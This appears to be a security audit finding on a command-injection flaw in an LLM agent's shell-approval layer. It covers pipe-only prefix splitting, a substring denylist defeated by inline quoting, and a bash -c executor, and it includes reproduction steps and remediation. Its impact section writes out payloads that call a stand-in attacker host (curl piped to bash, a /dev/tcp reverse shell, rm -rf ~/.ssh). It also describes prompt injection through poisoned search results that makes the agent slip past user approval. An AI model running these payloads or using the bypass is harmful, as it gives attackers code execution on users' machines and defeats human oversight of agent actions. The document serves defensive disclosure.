Phase: 8
Sequence: 006
Slug: agent-approval-shell-metachar-bypass
Verdict: VALID
Rationale: `extractBashPrefix` at `x/agent/approval.go:204-206` splits the command on `|` only — `;`, `&&`, `||`, `$()`, backticks all pass through — so approving `cat tools/file` caches the prefix `cat:tools/`, which then auto-approves `cat tools/file.go && cat /e''tc/shadow`; `IsDenied` uses `strings.Contains` with raw patterns, defeatable by any inline quoting (`''`, `""`, `\x??`). The agent then spawns via `exec.Command("bash","-c", cmd)` which IS a shell (not execve), so injected metachars execute. Advocate agrees; UI confirmation is the only remaining check and relies entirely on user vigilance for long commands.
Severity-Original: CRITICAL
Severity-Final: HIGH
PoC-Status: executed.
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-04/debate.md

## Summary

Three compounding defects produce a single command-injection primitive in the agent's approval layer:

1. **Pipe-only splitting**: `extractBashPrefix` (`x/agent/approval.go:204-206`) only splits on `|` before extracting the prefix. Any `;`, `&&`, `||`, `$(...)`, backticks, or newlines fall inside `parts[0]` — they are never examined.
2. **Denylist as substring**: `IsDenied` (`x/agent/approval.go:94-122`, called from `x/cmd/run.go:378`) uses `strings.Contains(cmd, pattern)` with literal patterns (`"rm -rf"`, `"curl -X POST"`, `"/etc/shadow"`, etc.). Any inline empty-quote (`r''m`, `r""m`, `${IFS}`, `$'\x72m'`) breaks the match while bash still evaluates the intended command.
3. **`bash -c` executor**: `x/tools/bash.go:64` invokes `exec.CommandContext(ctx, "bash", "-c", cmd)`. Bash is invoked AS a shell — metachars are interpreted by `/bin/bash`, not by Go's `execve`. This is the sole execution sink for approved commands.

The cache key produced by `extractBashPrefix` ignores everything after the first path-like argument. Once a user approves `cat tools/readme.md` for the session, the prefix `cat:tools/` enters the allowlist, and the agent's subsequent tool-calls reach `IsAllowed → true` when their first pipe-segment's first non-flag path arg happens to start with `tools/` — no matter what metachars follow.

## Location

- `x/agent/approval.go:94-122` — `denyPatterns` and `IsDenied` substring matcher
- `x/agent/approval.go:175-193` — `IsDenied(cmd)` implementation (called from cmd/run.go:378)
- `x/agent/approval.go:204-206` — `extractBashPrefix`: pipe-only split
- `x/agent/approval.go:215-284` — prefix extraction; flags (`-*`) skipped, first path-like arg becomes key
- `x/cmd/run.go:369-436` — tool-call approval + execution loop (sequential; mutex-protected)
- `x/tools/bash.go:64` — `exec.CommandContext(ctx, "bash", "-c", cmd)` — the actual shell sink

## Attacker Control

LLM/model output. Prompt injection via:
- Hostile system prompt or Modelfile
- RAG context (poisoned web_search / web_fetch response — intersects p8-064)
- Compromised plugin output

Concretely, the attacker emits a tool_call with the `command` argument containing metachars.

## Trust Boundary Crossed

B11 (LLM/model-supplied data → local host code execution).

## Impact

Arbitrary command execution on the victim's host with the ollama-user's privileges. Sample payloads that bypass both IsDenied and the prefix cache after a single "Allow for session" click on `cat tools/readme.md`:

- `cat tools/x && curl attacker.com/payload | bash`
- `cat tools/x; bash -i >& /dev/tcp/attacker/4444 0>&1`
- `cat tools/x$(curl -s attacker.com|sh)`
- `cat tools/x && r""m -rf ~/.ssh` (bypasses `rm` denylist via quoting)

Chains directly with p8-066 (command-substitution in path also collides with the approved prefix) and p8-067 (yolo mode skips IsAllowed entirely — the same bypass but with zero prompts). Compounds with p8-064 (attacker controls `web_search` response → prompt-injected model output → approved tool-call).

## Evidence

Tracer confirmed code on HEAD (`57653b8e`):
- `for _, call := range pendingToolCalls` is sequential — no goroutine race possible (negating H-05); the vulnerability is purely in the parser.
- `bash -c` is the invoker at `x/tools/bash.go:64`, so shell interpretation is the execution model (the key fact Advocate was asked to verify).
- `IsDenied("cat tools/f.go && r''m -rf /")` returns false via `strings.Contains` — explicitly traced.

Advocate: "The approval UI shows the FULL command to the user. A user confronted with `cat tools/file ; bash -i >& /dev/tcp/attacker/4444` would see the entire payload." Synthesizer counters: after "Allow for session", subsequent tool-calls may not re-prompt — the cache-keyed match means the malicious variant is auto-approved silently. This is the exact primitive that turns ONE innocuous approval into session-long RCE.

CodeQL `DFD-5-agent-bash` path_count: 8 (sources `RemoteFlowSource`, `os.Getenv`; sinks `exec.Command`).

## Reproduction Steps

1. Start `ollama run --agent` (non-yolo).
2. Prompt: "Show me the first 5 lines of tools/readme.md". LLM issues `cat tools/readme.md`. User selects "Allow for this session".
3. Next LLM turn (prompt-inject via a poisoned web_search response, or just continue the conversation with a hostile system prompt): LLM issues `cat tools/readme.md && curl -s http://attacker.com/x.sh | bash`.
4. Approval cache hit on `cat:tools/`. No re-prompt. `exec.Command("bash","-c", ...)` evaluates both commands. `/bin/bash` fetches and executes the payload.

Remediation:
- Split on ALL bash metachars before prefix extraction: `;`, `&&`, `||`, `$(`, `` ` ``, `|`, `&`, `>`, `<`, newline.
- Shift `IsDenied` from substring match to a tokenized-argv match after bash `printf %q` round-trip (or, simpler, reject ANY command containing unescaped metacharacters from the approved list).
- Invoke tools via `exec.Command(args[0], args[1:]...)` (execve) where possible; reserve `bash -c` for commands explicitly confirmed to require shell features.
- Re-prompt on command variance: if `IsAllowed` returns true but the command contains metachars NOT present in the original approval's command, re-ask.

---

Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: End-to-end reproduction against upstream `x/agent` at HEAD (57653b8e) confirms `mgr.IsAllowed` returns true for `cat tools/readme.md && <payload>` after approving benign `cat tools/readme.md`, `IsDenied` returns false for `r''m -rf` and `/e''tc/shadow`, and `exec.CommandContext(ctx, "bash", "-c", cmd)` at x/tools/bash.go:64 executes the injected command (marker file written to disk).
Severity-Final: HIGH
PoC-Status: executed
Review: archon/adversarial-reviews/agent-approval-shell-metachar-bypass-review.md
Evidence: archon/real-env-evidence/agent-approval-shell-metachar-bypass/e2e-run.log
